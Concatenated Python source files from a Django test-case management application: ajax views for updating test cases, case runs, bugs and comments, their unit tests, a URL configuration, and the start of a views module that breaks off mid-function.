    if pipe is None:
        error = 'Unsupported value type.'
    else:
        try:
            value = pipe(val)
        except Exception as e:
            error = str(e)
    return value, error


def say_no(error_msg):
    ajax_response = {'rc': 1, 'response': error_msg}
    return HttpResponse(json.dumps(ajax_response))


def say_yes():
    return HttpResponse(json.dumps({'rc': 0, 'response': 'ok'}))


# Deprecated. Not flexible.
@require_POST
def update(request):
    """"""
    Generic approach to update a model,\n
    based on contenttype.
    """"""
    now = datetime.datetime.now()

    data = request.POST.copy()
    ctype = data.get(""content_type"")
    vtype = data.get('value_type', 'str')
    object_pk_str = data.get(""object_pk"")
    field = data.get('field')
    value = data.get('value')

    object_pk = [int(a) for a in object_pk_str.split(',')]

    if not field or not value or not object_pk or not ctype:
        return say_no(
            'Following fields are required - content_type, '
            'object_pk, field and value.')

    # Convert the value type
    # FIXME: Django bug here: update() keywords must be strings
    field = str(field)

    value, error = get_value_by_type(value, vtype)
    if error:
        return say_no(error)
    has_perms = check_permission(request, ctype)
    if not has_perms:
        return say_no('Permission Dinied.')

    model = apps.get_model(*ctype.split(""."", 1))
    targets = model._default_manager.filter(pk__in=object_pk)

    if not targets:
        return say_no('No record found')
    if not hasattr(targets[0], field):
        return say_no('%s has no field %s' % (ctype, field))

    if hasattr(targets[0], 'log_action'):
        for t in targets:
            try:
                t.log_action(
                    who=request.user,
                    action='Field %s changed from %s to %s.' % (
                        field, getattr(t, field), value
                    )
                )
            except (AttributeError, User.DoesNotExist):
                pass
    objects_update(targets, **{field: value})

    if hasattr(model, 'mail_scene'):
        mail_context = model.mail_scene(
            objects=targets, field=field, value=value, ctype=ctype,
            object_pk=object_pk,
        )
        if mail_context:
            from tcms.core.utils.mailto import mailto

            mail_context['context']['user'] = request.user
            try:
                mailto(**mail_context)
            except Exception:  # nosec:B110:try_except_pass
                pass

    # Special hacking for updating test case run status
    if ctype == 'testruns.testcaserun' and field == 'case_run_status':
        for t in targets:
            field = 'close_date'
            t.log_action(
                who=request.user,
                action='Field %s changed from %s to %s.' % (
                    field, getattr(t, field), now
                )
            )
            if t.tested_by != request.user:
                field = 'tested_by'
                t.log_action(
                    who=request.user,
                    action='Field %s changed from %s to %s.' % (
                        field, getattr(t, field), request.user
                    )
                )

            field = 'assignee'
            try:
                assignee = t.assginee
                if assignee != request.user:
                    t.log_action(
                        who=request.user,
                        action='Field %s changed from %s to %s.' % (
                            field, getattr(t, field), request.user
                        )
                    )
                    # t.assignee = request.user
                t.save()
            except (AttributeError, User.DoesNotExist):
                pass
        targets.update(close_date=now, tested_by=request.user)
    return say_yes()


@require_POST
def update_case_run_status(request):
    """"""
    Update Case Run status.
    """"""
    now = datetime.datetime.now()

    data = request.POST.copy()
    ctype = data.get(""content_type"")
    vtype = data.get('value_type', 'str')
    object_pk_str = data.get(""object_pk"")
    field = data.get('field')
    value = data.get('value')

    object_pk = [int(a) for a in object_pk_str.split(',')]

    if not field or not value or not object_pk or not ctype:
        return say_no(
            'Following fields are required - content_type, '
            'object_pk, field and value.')

    # Convert the value type
    # FIXME: Django bug here: update() keywords must be strings
    field = str(field)

    value, error = get_value_by_type(value, vtype)
    if error:
        return say_no(error)
    has_perms = check_permission(request, ctype)
    if not has_perms:
        return say_no('Permission Dinied.')

    model = apps.get_model(*ctype.split(""."", 1))
    targets = model._default_manager.filter(pk__in=object_pk)

    if not targets:
        return say_no('No record found')
    if not hasattr(targets[0], field):
        return say_no('%s has no field %s' % (ctype, field))

    if hasattr(targets[0], 'log_action'):
        for t in targets:
            try:
                t.log_action(
                    who=request.user,
                    action='Field {} changed from {} to {}.'.format(
                        field,
                        getattr(t, field),
                        TestCaseRunStatus.id_to_string(value),
                    )
                )
            except (AttributeError, User.DoesNotExist):
                pass
    objects_update(targets, **{field: value})

    if hasattr(model, 'mail_scene'):
        from tcms.core.utils.mailto import mailto

        mail_context = model.mail_scene(
            objects=targets, field=field, value=value, ctype=ctype,
            object_pk=object_pk,
        )
        if mail_context:
            mail_context['context']['user'] = request.user
            try:
                mailto(**mail_context)
            except Exception:  # nosec:B110:try_except_pass
                pass

    # Special hacking for updating test case run status
    if ctype == 'testruns.testcaserun' and field == 'case_run_status':
        for t in targets:
            field = 'close_date'
            t.log_action(
                who=request.user,
                action='Field %s changed from %s to %s.' % (
                    field, getattr(t, field), now
                )
            )
            if t.tested_by != request.user:
                field = 'tested_by'
                t.log_action(
                    who=request.user,
                    action='Field %s changed from %s to %s.' % (
                        field, getattr(t, field), request.user
                    )
                )

            field = 'assignee'
            try:
                assignee = t.assginee
                if assignee != request.user:
                    t.log_action(
                        who=request.user,
                        action='Field %s changed from %s to %s.' % (
                            field, getattr(t, field), request.user
                        )
                    )
                    # t.assignee = request.user
                t.save()
            except (AttributeError, User.DoesNotExist):
                pass
        targets.update(close_date=now, tested_by=request.user)

    return HttpResponse(json.dumps({'rc': 0, 'response': 'ok'}))


class ModelUpdateActions(object):
    """"""Abstract class defining interfaces to update a model properties""""""


class TestCaseUpdateActions(ModelUpdateActions):
    """"""Actions to update each possible proprety of TestCases

    Define your own method named _update_[property name] to hold specific
    update logic.
    """"""

    ctype = 'testcases.testcase'

    def __init__(self, request):
        self.request = request
        self.target_field = request.POST.get('target_field')
        self.new_value = request.POST.get('new_value')

    def get_update_action(self):
        return getattr(self, '_update_%s' % self.target_field, None)

    def update(self):
        has_perms = check_permission(self.request, self.ctype)
        if not has_perms:
            return say_no(""You don't have enough permission to update TestCases."")

        action = self.get_update_action()
        if action is not None:
            try:
                resp = action()
                self._sendmail()
            except ObjectDoesNotExist as err:
                return say_no(str(err))
            except Exception:
                # TODO: besides this message to users, what happening should be
                # recorded in the system log.
                return say_no('Update failed. Please try again or request '
                              'support from your organization.')
            else:
                if resp is None:
                    resp = say_yes()
                return resp
        return say_no('Not know what to update.')

    def get_update_targets(self):
        """"""Get selected cases to update their properties""""""
        case_ids = map(int, self.request.POST.getlist('case'))
        self._update_objects = TestCase.objects.filter(pk__in=case_ids)
        return self._update_objects

    def get_plan(self, pk_enough=True):
        try:
            return plan_from_request_or_none(self.request, pk_enough)
        except Http404:
            return None

    def _sendmail(self):
        mail_context = TestCase.mail_scene(objects=self._update_objects,
                                           field=self.target_field,
                                           value=self.new_value)
        if mail_context:
            from tcms.core.utils.mailto import mailto

            mail_context['context']['user'] = self.request.user
            try:
                mailto(**mail_context)
            except Exception:  # nosec:B110:try_except_pass
                pass

    def _update_priority(self):
        exists = Priority.objects.filter(pk=self.new_value).exists()
        if not exists:
            raise ObjectDoesNotExist('The priority you specified to change '
                                     'does not exist.')
        self.get_update_targets().update(**{str(self.target_field): self.new_value})

    def _update_default_tester(self):
        try:
            user = User.objects.get(Q(username=self.new_value) | Q(email=self.new_value))
        except User.DoesNotExist:
            raise ObjectDoesNotExist('Default tester not found!')
        self.get_update_targets().update(**{str(self.target_field): user.pk})

    def _update_case_status(self):
        try:
            new_status = TestCaseStatus.objects.get(pk=self.new_value)
        except TestCaseStatus.DoesNotExist:
            raise ObjectDoesNotExist('The status you choose does not exist.')

        update_object = self.get_update_targets()
        if not update_object:
            return say_no('No record(s) found')

        for testcase in update_object:
            if hasattr(testcase, 'log_action'):
                testcase.log_action(
                    who=self.request.user,
                    action='Field %s changed from %s to %s.' % (
                        self.target_field, testcase.case_status, new_status.name
                    )
                )
        update_object.update(**{str(self.target_field): self.new_value})

        # ###
        # Case is moved between Cases and Reviewing Cases tabs accoding to the
        # change of status. Meanwhile, the number of cases with each status
        # should be updated also.

        try:
            plan = plan_from_request_or_none(self.request)
        except Http404:
            return say_no(""No plan record found."")
        else:
            if plan is None:
                return say_no('No plan record found.')

        confirm_status_name = 'CONFIRMED'
        plan.run_case = plan.case.filter(case_status__name=confirm_status_name)
        plan.review_case = plan.case.exclude(case_status__name=confirm_status_name)
        run_case_count = plan.run_case.count()
        case_count = plan.case.count()
        # FIXME: why not calculate review_case_count or run_case_count by using
        # substraction, which saves one SQL query.
        review_case_count = plan.review_case.count()

        return http.JsonResponse({
            'rc': 0, 'response': 'ok',
            'run_case_count': run_case_count,
            'case_count': case_count,
            'review_case_count': review_case_count,
        })

    def _update_sortkey(self):
        try:
            sortkey = int(self.new_value)
            if sortkey < 0 or sortkey > 32300:
                return say_no('New sortkey is out of range [0, 32300].')
        except ValueError:
            return say_no('New sortkey is not an integer.')
        plan = plan_from_request_or_none(self.request, pk_enough=True)
        if plan is None:
            return say_no('No plan record found.')
        update_targets = self.get_update_targets()

        # ##
        # MySQL does not allow to exeucte UPDATE statement that contains
        # subquery querying from same table. In this case, OperationError will
        # be raised.
        offset = 0
        step_length = 500
        queryset_filter = TestCasePlan.objects.filter
        data = {self.target_field: sortkey}
        while 1:
            sub_cases = update_targets[offset:offset + step_length]
            case_pks = [case.pk for case in sub_cases]
            if len(case_pks) == 0:
                break
            queryset_filter(plan=plan, case__in=case_pks).update(**data)
            # Move to next batch of cases to change.
            offset += step_length

    def _update_reviewer(self):
        reviewers = User.objects.filter(username=self.new_value).values_list('pk', flat=True)
        if not reviewers:
            err_msg = 'Reviewer %s is not found' % self.new_value
            raise ObjectDoesNotExist(err_msg)
        self.get_update_targets().update(**{str(self.target_field): reviewers[0]})


# NOTE: what permission is necessary
# FIXME: find a good chance to map all TestCase property change request to this
@require_POST
def update_cases_default_tester(request):
    """"""Update default tester upon selected TestCases""""""
    proxy = TestCaseUpdateActions(request)
    return proxy.update()


update_cases_priority = update_cases_default_tester
update_cases_case_status = update_cases_default_tester
update_cases_sortkey = update_cases_default_tester
update_cases_reviewer = update_cases_default_tester


@require_POST
def comment_case_runs(request):
    """"""
    Add comment to one or more caseruns at a time.
    """"""
    data = request.POST.copy()
    comment = data.get('comment', None)
    if not comment:
        return say_no('Comments needed')
    run_ids = [i for i in data.get('run', '').split(',') if i]
    if not run_ids:
        return say_no('No runs selected.')
    runs = TestCaseRun.objects.filter(pk__in=run_ids).only('pk')
    if not runs:
        return say_no('No caserun found.')
    add_comment(runs, comment, request.user)
    return say_yes()


def clean_bug_form(request):
    """"""
    Verify the form data, return a tuple\n
    (None, ERROR_MSG) on failure\n
    or\n
    (data_dict, '') on success.\n
    """"""
    data = {}
    try:
        data['bugs'] = request.GET.get('bug_id', '').split(',')
        data['runs'] = map(int, request.GET.get('case_runs', '').split(','))
    except (TypeError, ValueError) as e:
        return (None, 'Please specify only integers for bugs, '
                      'caseruns(using comma to seperate IDs), '
                      'and bug_system. (DEBUG INFO: %s)' % str(e))

    data['bug_system_id'] = int(request.GET.get('bug_system_id', 1))

    if request.GET.get('a') not in ('add', 'remove'):
        return (None, 'Actions only allow ""add"" and ""remove"".')
    else:
        data['action'] = request.GET.get('a')
    data['bz_external_track'] = True if request.GET.get('bz_external_track',
                                                        False) else False

    return (data, '')


def update_bugs_to_caseruns(request):
    """"""
    Add one or more bugs to or remove that from\n
    one or more caserun at a time.
    """"""
    data, error = clean_bug_form(request)
    if error:
        return say_no(error)
    runs = TestCaseRun.objects.filter(pk__in=data['runs'])
    bug_system_id = data['bug_system_id']
    bug_ids = data['bugs']

    try:
        validate_bug_id(bug_ids, bug_system_id)
    except ValidationError as e:
        return say_no(str(e))

    bz_external_track = data['bz_external_track']
    action = data['action']
    try:
        if action == ""add"":
            for run in runs:
                for bug_id in bug_ids:
                    run.add_bug(bug_id=bug_id,
                                bug_system_id=bug_system_id,
                                bz_external_track=bz_external_track)
        else:
            bugs = Bug.objects.filter(bug_id__in=bug_ids)
            for run in runs:
                for bug in bugs:
                    if bug.case_run_id == run.pk:
                        run.remove_bug(bug.bug_id, run.pk)
    except Exception as e:
        return say_no(str(e))
    return say_yes()


def get_prod_related_objs(p_pks, target):
    """"""
    Get Component, Version, Category, and Build\n
    Return [(id, name), (id, name)]
    """"""
    ctypes = {
        'component': (Component, 'name'),
        'version': (Version, 'value'),
        'build': (Build, 'name'),
        'category': (Category, 'name'),
    }
    results = ctypes[target][0]._default_manager.filter(product__in=p_pks)
    attr = ctypes[target][1]
    results = [(r.pk, getattr(r, attr)) for r in results]
    return results


def get_prod_related_obj_json(request):
    """"""
    View for updating product drop-down\n
    in a Ajax way.
    """"""
    data = request.GET.copy()
    target = data.get('target', None)
    p_pks = data.get('p_ids', None)
    sep = data.get('sep', None)
    # py2.6: all(*values) => boolean ANDs
    if target and p_pks and sep:
        p_pks = [k for k in p_pks.split(sep) if k]
        res = get_prod_related_objs(p_pks, target)
    else:
        res = []
    return HttpResponse(json.dumps(res))


def objects_update(objects, **kwargs):
    objects.update(**kwargs)
    kwargs['instances'] = objects
    if objects.model.__name__ == TestCaseRun.__name__ and kwargs.get(
            'case_run_status', None):
        POST_UPDATE_SIGNAL.send(sender=None, **kwargs)
/n/n/ntcms/core/tests/test_views.py/n/n# -*- coding: utf-8 -*-

import json
from http import HTTPStatus
from urllib.parse import urlencode

from django import test
from django.conf import settings
from django.contrib.contenttypes.models import ContentType
from django.core import serializers
from django.urls import reverse
from django_comments.models import Comment

from tcms.management.models import Priority
from tcms.management.models import EnvGroup
from tcms.management.models import EnvProperty
from tcms.testcases.forms import TestCase
from tcms.testplans.models import TestPlan
from tcms.testruns.models import TestCaseRun
from tcms.testruns.models import TestCaseRunStatus
from tcms.tests import BaseCaseRun
from tcms.tests import BasePlanCase
from tcms.tests import remove_perm_from_user
from tcms.tests import user_should_have_perm
from tcms.tests.factories import UserFactory
from tcms.tests.factories import EnvGroupFactory
from tcms.tests.factories import EnvGroupPropertyMapFactory
from tcms.tests.factories import EnvPropertyFactory


class TestNavigation(test.TestCase):
    @classmethod
    def setUpTestData(cls):
        super(TestNavigation, cls).setUpTestData()
        cls.user = UserFactory(email='user+1@example.com')
        cls.user.set_password('testing')
        cls.user.save()

    def test_urls_for_emails_with_pluses(self):
        # test for https://github.com/Nitrate/Nitrate/issues/262
        # when email contains + sign it needs to be properly urlencoded
        # before passing it as query string argument to the search views
        self.client.login(  # nosec:B106:hardcoded_password_funcarg
            username=self.user.username,
            password='testing')
        response = self.client.get(reverse('iframe-navigation'))

        self.assertContains(response, urlencode({'people': self.user.email}))
        self.assertContains(response, urlencode({'author__email__startswith': self.user.email}))


class TestIndex(BaseCaseRun):
    def test_when_not_logged_in_index_page_redirects_to_login(self):
        response = self.client.get(reverse('core-views-index'))
        self.assertRedirects(
            response,
            reverse('tcms-login'),
            target_status_code=HTTPStatus.OK)

    def test_when_logged_in_index_page_redirects_to_dashboard(self):
        self.client.login(  # nosec:B106:hardcoded_password_funcarg
            username=self.tester.username,
            password='password')
        response = self.client.get(reverse('core-views-index'))
        self.assertRedirects(
            response,
            reverse('tcms-recent', args=[self.tester.username]),
            target_status_code=HTTPStatus.OK)


class TestCommentCaseRuns(BaseCaseRun):
    """"""Test case for ajax.comment_case_runs""""""

    @classmethod
    def setUpTestData(cls):
        super(TestCommentCaseRuns, cls).setUpTestData()
        cls.many_comments_url = reverse('ajax-comment_case_runs')

    def test_refuse_if_missing_comment(self):
        self.client.login(  # nosec:B106:hardcoded_password_funcarg
            username=self.tester.username,
            password='password')

        response = self.client.post(self.many_comments_url,
                                    {'run': [self.case_run_1.pk, self.case_run_2.pk]})
        self.assertJSONEqual(
            str(response.content, encoding=settings.DEFAULT_CHARSET),
            {'rc': 1, 'response': 'Comments needed'})

    def test_refuse_if_missing_no_case_run_pk(self):
        self.client.login(  # nosec:B106:hardcoded_password_funcarg
            username=self.tester.username,
            password='password')

        response = self.client.post(self.many_comments_url,
                                    {'comment': 'new comment', 'run': []})
        self.assertJSONEqual(
            str(response.content, encoding=settings.DEFAULT_CHARSET),
            {'rc': 1, 'response': 'No runs selected.'})

        response = self.client.post(self.many_comments_url,
                                    {'comment': 'new comment'})
        self.assertJSONEqual(
            str(response.content, encoding=settings.DEFAULT_CHARSET),
            {'rc': 1, 'response': 'No runs selected.'})

    def test_refuse_if_passed_case_run_pks_not_exist(self):
        self.client.login(  # nosec:B106:hardcoded_password_funcarg
            username=self.tester.username,
            password='password')

        response = self.client.post(self.many_comments_url,
                                    {'comment': 'new comment',
                                     'run': '99999998,1009900'})
        self.assertJSONEqual(
            str(response.content, encoding=settings.DEFAULT_CHARSET),
            {'rc': 1, 'response': 'No caserun found.'})

    def test_add_comment_to_case_runs(self):
        self.client.login(  # nosec:B106:hardcoded_password_funcarg
            username=self.tester.username,
            password='password')

        new_comment = 'new comment'
        response = self.client.post(
            self.many_comments_url,
            {'comment': new_comment,
             'run': ','.join([str(self.case_run_1.pk),
                              str(self.case_run_2.pk)])})
        self.assertJSONEqual(
            str(response.content, encoding=settings.DEFAULT_CHARSET),
            {'rc': 0, 'response': 'ok'})

        # Assert comments are added
        case_run_ct = ContentType.objects.get_for_model(TestCaseRun)

        for case_run_pk in (self.case_run_1.pk, self.case_run_2.pk):
            comments = Comment.objects.filter(object_pk=case_run_pk,
                                              content_type=case_run_ct)
            self.assertEqual(new_comment, comments[0].comment)
            self.assertEqual(self.tester, comments[0].user)


class TestUpdateObject(BasePlanCase):
    """"""Test case for update""""""

    @classmethod
    def setUpTestData(cls):
        super(TestUpdateObject, cls).setUpTestData()

        cls.permission = 'testplans.change_testplan'
        cls.update_url = reverse('ajax-update')

    def setUp(self):
        user_should_have_perm(self.tester, self.permission)

    def test_refuse_if_missing_permission(self):
        self.client.login(  # nosec:B106:hardcoded_password_funcarg
            username=self.tester.username,
            password='password')

        remove_perm_from_user(self.tester, self.permission)

        post_data = {
            'content_type': 'testplans.testplan',
            'object_pk': self.plan.pk,
            'field': 'is_active',
            'value': 'False',
            'value_type': 'bool'
        }

        response = self.client.post(self.update_url, post_data)

        self.assertJSONEqual(
            str(response.content, encoding=settings.DEFAULT_CHARSET),
            {'rc': 1, 'response': 'Permission Dinied.'})

    def test_update_plan_is_active(self):
        self.client.login(  # nosec:B106:hardcoded_password_funcarg
            username=self.tester.username,
            password='password')

        post_data = {
            'content_type': 'testplans.testplan',
            'object_pk': self.plan.pk,
            'field': 'is_active',
            'value': 'False',
            'value_type': 'bool'
        }

        response = self.client.post(self.update_url, post_data)

        self.assertJSONEqual(
            str(response.content, encoding=settings.DEFAULT_CHARSET),
            {'rc': 0, 'response': 'ok'})
        plan = TestPlan.objects.get(pk=self.plan.pk)
        self.assertFalse(plan.is_active)


class TestUpdateCaseRunStatus(BaseCaseRun):
    """"""Test case for update_case_run_status""""""

    @classmethod
    def setUpTestData(cls):
        super(TestUpdateCaseRunStatus, cls).setUpTestData()

        cls.permission = 'testruns.change_testcaserun'
        cls.update_url = reverse('ajax-update_case_run_status')

    def setUp(self):
        user_should_have_perm(self.tester, self.permission)

    def test_refuse_if_missing_permission(self):
        remove_perm_from_user(self.tester, self.permission)
        self.client.login(  # nosec:B106:hardcoded_password_funcarg
            username=self.tester.username,
            password='password')

        response = self.client.post(self.update_url, {
            'content_type': 'testruns.testcaserun',
            'object_pk': self.case_run_1.pk,
            'field': 'case_run_status',
            'value': str(TestCaseRunStatus.objects.get(name='PAUSED').pk),
            'value_type': 'int',
        })

        self.assertJSONEqual(
            str(response.content, encoding=settings.DEFAULT_CHARSET),
            {'rc': 1, 'response': 'Permission Dinied.'})

    def test_change_case_run_status(self):
        self.client.login(  # nosec:B106:hardcoded_password_funcarg
            username=self.tester.username,
            password='password')

        response = self.client.post(self.update_url, {
            'content_type': 'testruns.testcaserun',
            'object_pk': self.case_run_1.pk,
            'field': 'case_run_status',
            'value': str(TestCaseRunStatus.objects.get(name='PAUSED').pk),
            'value_type': 'int',
        })

        self.assertJSONEqual(
            str(response.content, encoding=settings.DEFAULT_CHARSET),
            {'rc': 0, 'response': 'ok'})
        self.assertEqual(
            'PAUSED', TestCaseRun.objects.get(pk=self.case_run_1.pk).case_run_status.name)


class TestUpdateCasePriority(BasePlanCase):
    """"""Test case for update_cases_default_tester""""""

    @classmethod
    def setUpTestData(cls):
        super(TestUpdateCasePriority, cls).setUpTestData()

        cls.permission = 'testcases.change_testcase'
        cls.case_update_url = reverse('ajax-update_cases_default_tester')

    def setUp(self):
        user_should_have_perm(self.tester, self.permission)

    def test_refuse_if_missing_permission(self):
        remove_perm_from_user(self.tester, self.permission)
        self.client.login(  # nosec:B106:hardcoded_password_funcarg
            username=self.tester.username,
            password='password')

        response = self.client.post(
            self.case_update_url,
            {
                'target_field': 'priority',
                'from_plan': self.plan.pk,
                'case': [self.case_1.pk, self.case_3.pk],
                'new_value': Priority.objects.get(value='P3').pk,
            })

        self.assertJSONEqual(
            str(response.content, encoding=settings.DEFAULT_CHARSET),
            {'rc': 1, 'response': ""You don't have enough permission to ""
                                  ""update TestCases.""})

    def test_update_case_priority(self):
        self.client.login(  # nosec:B106:hardcoded_password_funcarg
            username=self.tester.username,
            password='password')

        response = self.client.post(
            self.case_update_url,
            {
                'target_field': 'priority',
                'from_plan': self.plan.pk,
                'case': [self.case_1.pk, self.case_3.pk],
                'new_value': Priority.objects.get(value='P3').pk,
            })

        self.assertJSONEqual(
            str(response.content, encoding=settings.DEFAULT_CHARSET),
            {'rc': 0, 'response': 'ok'})

        for pk in (self.case_1.pk, self.case_3.pk):
            self.assertEqual('P3', TestCase.objects.get(pk=pk).priority.value)


class TestGetObjectInfo(BasePlanCase):
    """"""Test case for info view method""""""

    @classmethod
    def setUpTestData(cls):
        super(TestGetObjectInfo, cls).setUpTestData()

        cls.get_info_url = reverse('ajax-info')

        cls.group_nitrate = EnvGroupFactory(name='nitrate')
        cls.group_new = EnvGroupFactory(name='NewGroup')

        cls.property_os = EnvPropertyFactory(name='os')
        cls.property_python = EnvPropertyFactory(name='python')
        cls.property_django = EnvPropertyFactory(name='django')

        EnvGroupPropertyMapFactory(group=cls.group_nitrate,
                                   property=cls.property_os)
        EnvGroupPropertyMapFactory(group=cls.group_nitrate,
                                   property=cls.property_python)
        EnvGroupPropertyMapFactory(group=cls.group_new,
                                   property=cls.property_django)

    def test_get_env_properties(self):
        response = self.client.get(self.get_info_url, {'info_type': 'env_properties'})

        expected_json = json.loads(
            serializers.serialize(
                'json',
                EnvProperty.objects.all(),
                fields=('name', 'value')))
        self.assertJSONEqual(
            str(response.content, encoding=settings.DEFAULT_CHARSET),
            expected_json)

    def test_get_env_properties_by_group(self):
        response = self.client.get(self.get_info_url,
                                   {'info_type': 'env_properties',
                                    'env_group_id': self.group_new.pk})

        group = EnvGroup.objects.get(pk=self.group_new.pk)
        expected_json = json.loads(
            serializers.serialize(
                'json',
                group.property.all(),
                fields=('name', 'value')))
        self.assertJSONEqual(
            str(response.content, encoding=settings.DEFAULT_CHARSET),
            expected_json)
/n/n/ntcms/testcases/tests/test_form_views.py/n/n# -*- coding: utf-8 -*-

from django import test
from django.urls import reverse
from django.conf import settings

from tcms.testcases.forms import CaseAutomatedForm


class TestForm_AutomatedView(test.TestCase):
    def test_get_form(self):
        """"""Verify the view renders the expected HTML""""""
        response = self.client.get(reverse('testcases-form-automated'))
        form = CaseAutomatedForm()
        self.assertHTMLEqual(str(response.content, encoding=settings.DEFAULT_CHARSET), form.as_p())
/n/n/ntcms/testcases/urls/cases_urls.py/n/n# -*- coding: utf-8 -*-

from django.conf.urls import url

from .. import views

urlpatterns = [
    url(r'^new/$', views.new, name='testcases-new'),
    url(r'^$', views.all, name='testcases-all'),
    url(r'^search/$', views.search, name='testcases-search'),
    url(r'^load-more/$', views.load_more_cases),
    url(r'^ajax/$', views.ajax_search, name='testcases-ajax_search'),
    url(r'^form/automated/$', views.form_automated, name='testcases-form-automated'),
    url(r'^automated/$', views.automated, name='testcases-automated'),
    url(r'^component/$', views.component, name='testcases-component'),
    url(r'^category/$', views.category, name='testcases-category'),
    url(r'^clone/$', views.clone, name='testcases-clone'),
    url(r'^printable/$', views.printable, name='testcases-printable'),
    url(r'^export/$', views.export, name='testcases-export'),
]
/n/n/ntcms/testcases/views.py/n/n# -*- coding: utf-8 -*-

import datetime
import json
import itertools

from django.conf import settings
from django.contrib import messages
from django.contrib.auth.decorators import permission_required
from django.contrib.contenttypes.models import ContentType
from django.core.exceptions import ObjectDoesNotExist
from django.urls import reverse
from django.db.models import Count
from django.http import HttpResponseRedirect, HttpResponse, Http404
from django.shortcuts import get_object_or_404, render
from django.template.loader import render_to_string
from django.utils.translation import ugettext_lazy as _
from django.views.decorators.http import require_GET
from django.views.decorators.http import require_POST
from django.views.generic.base import TemplateView

from django_comments.models import Comment

from tcms.core.utils import form_errors_to_list
from tcms.core.logs.models import TCMSLogModel
from tcms.core.utils.raw_sql import RawSQL
from tcms.core.utils import DataTableResult
from tcms.search import remove_from_request_path
from tcms.search.order import order_case_queryset
from tcms.testcases import actions
from tcms.testcases import data
from tcms.testcases.models import TestCase, TestCaseStatus, \
    TestCasePlan, BugSystem, \
    Bug, TestCaseText, TestCaseComponent
from tcms.management.models import Priority, Tag
from tcms.testplans.models import TestPlan
from tcms.testruns.models import TestCaseRun
from tcms.testruns.models import TestCaseRunStatus
from tcms.testcases.forms import CaseAutomatedForm, NewCaseForm, \
    SearchCaseForm, EditCaseForm, CaseNotifyForm, \
    CloneCaseForm, CaseBugForm
from tcms.testplans.forms import SearchPlanForm
from tcms.utils.dict_utils import create_dict_from_query
from .fields import CC_LIST_DEFAULT_DELIMITER


TESTCASE_OPERATION_ACTIONS = (
    'search', 'sort', 'update',
    'remove',  # including remove tag from cases
    'add',  # including add tag to cases
    'change',
    'delete_cases',  # unlink cases from a TestPlan
)


# _____________________________________________________________________________
# helper functions


def plan_from_request_or_none(request, pk_enough=False):
    """"""Get TestPlan from REQUEST

    This method relies on the existence of from_plan within REQUEST.

    Arguments:
    - pk_enough: a choice for invoker to determine whether the ID is enough.
    """"""
    tp_id = request.POST.get(""from_plan"") or request.GET.get(""from_plan"")
    if tp_id:
        if pk_enough:
            try:
                tp = int(tp_id)
            except ValueError:
                tp = None
        else:
            tp = get_object_or_404(TestPlan, plan_id=tp_id)
    else:
        tp = None
    return tp


def update_case_email_settings(tc, n_form):
    """"""Update testcase's email settings.""""""

    tc.emailing.notify_on_case_update = n_form.cleaned_data[
        'notify_on_case_update']
    tc.emailing.notify_on_case_delete = n_form.cleaned_data[
        'notify_on_case_delete']
    tc.emailing.auto_to_case_author = n_form.cleaned_data[
        'author']
    tc.emailing.auto_to_case_tester = n_form.cleaned_data[
        'default_tester_of_case']
    tc.emailing.auto_to_run_manager = n_form.cleaned_data[
        'managers_of_runs']
    tc.emailing.auto_to_run_tester = n_form.cleaned_data[
        'default_testers_of_runs']
    tc.emailing.auto_to_case_run_assignee = n_form.cleaned_data[
        'assignees_of_case_runs']
    tc.emailing.save()

    default_tester = n_form.cleaned_data['default_tester_of_case']
    if (default_tester and tc.default_tester_id):
        tc.emailing.auto_to_case_tester = True

    # Continue to update CC list
    valid_emails = n_form.cleaned_data['cc_list']
    tc.emailing.update_cc_list(valid_emails)


def group_case_bugs(bugs):
    """"""Group bugs using bug_id.""""""
    bugs = itertools.groupby(bugs, lambda b: b.bug_id)
    bugs = [(pk, list(_bugs)) for pk, _bugs in bugs]
    return bugs


def create_testcase(request, form, tp):
    """"""Create testcase""""""
    tc = TestCase.create(author=request.user, values=form.cleaned_data)
    tc.add_text(case_text_version=1,
                author=request.user,
                action=form.cleaned_data['action'],
                effect=form.cleaned_data['effect'],
                setup=form.cleaned_data['setup'],
                breakdown=form.cleaned_data['breakdown'])

    # Assign the case to the plan
    if tp:
        tc.add_to_plan(plan=tp)

    # Add components into the case
    for component in form.cleaned_data['component']:
        tc.add_component(component=component)
    return tc


@require_GET
def form_automated(request):
    """"""
        Return HTML for the form which allows changing of automated status.
        Form submission is handled by automated() below.
    """"""
    form = CaseAutomatedForm()
    return HttpResponse(form.as_p())


@require_POST
@permission_required('testcases.change_testcase')
def automated(request):
    """"""Change the automated status for cases

    Parameters:
    - a: Actions
    - case: IDs for case_id
    - o_is_automated: Status for is_automated
    - o_is_automated_proposed: Status for is_automated_proposed

    Returns:
    - Serialized JSON

    """"""
    ajax_response = {'rc': 0, 'response': 'ok'}

    form = CaseAutomatedForm(request.POST)
    if form.is_valid():
        tcs = get_selected_testcases(request)

        if form.cleaned_data['a'] == 'change':
            if isinstance(form.cleaned_data['is_automated'], int):
                # FIXME: inconsistent operation updating automated property
                # upon TestCases. Other place to update property upon
                # TestCase via Model.save, that will trigger model
                #        singal handlers.
                tcs.update(is_automated=form.cleaned_data['is_automated'])
            if isinstance(form.cleaned_data['is_automated_proposed'], bool):
                tcs.update(is_automated_proposed=form.cleaned_data['is_automated_proposed'])
    else:
        ajax_response['rc'] = 1
        ajax_response['response'] = form_errors_to_list(form)

    return HttpResponse(json.dumps(ajax_response))


@permission_required('testcases.add_testcase')
def new(request, template_name='case/new.html'):
    """"""New testcase""""""
    tp = plan_from_request_or_none(request)
    # Initial the form parameters when write new case from plan
    if tp:
        default_form_parameters = {
            'product': tp.product_id,
            'is_automated': '0',
        }
    # Initial the form parameters when write new case directly
    else:
        default_form_parameters = {'is_automated': '0'}

    if request.method == ""POST"":
        form = NewCaseForm(request.POST)
        if request.POST.get('product'):
            form.populate(product_id=request.POST['product'])
        else:
            form.populate()

        if form.is_valid():
            tc = create_testcase(request, form, tp)

            class ReturnActions(object):
                def __init__(self, case, plan):
                    self.__all__ = ('_addanother', '_continue', '_returntocase', '_returntoplan')
                    self.case = case
                    self.plan = plan

                def _continue(self):
                    if self.plan:
                        return HttpResponseRedirect(
                            '%s?from_plan=%s' % (reverse('testcases-edit',
                                                         args=[self.case.case_id]),
                                                 self.plan.plan_id))

                    return HttpResponseRedirect(
                        reverse('testcases-edit', args=[tc.case_id]))

                def _addanother(self):
                    form = NewCaseForm(initial=default_form_parameters)

                    if tp:
                        form.populate(product_id=self.plan.product_id)

                    return form

                def _returntocase(self):
                    if self.plan:
                        return HttpResponseRedirect(
                            '%s?from_plan=%s' % (reverse('testcases-get',
                                                         args=[self.case.pk]),
